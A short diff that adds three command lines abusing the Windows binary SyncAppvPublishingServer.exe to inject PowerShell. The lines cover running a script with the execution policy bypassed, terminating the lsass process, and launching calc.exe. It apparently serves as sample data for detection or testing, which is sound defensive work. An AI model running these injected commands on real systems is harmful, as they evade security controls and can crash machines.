@@ -1,0 +1,3 @@
+SyncAppvPublishingServer.exe "n;"  -ExecutionPolicy Bypass -File script.ps1
+SyncAppvPublishingServer.exe "n;`nStop-Process -Name 'lsass'"
+SyncAppvPublishingServer.exe "n;Start-Process calc.exe"
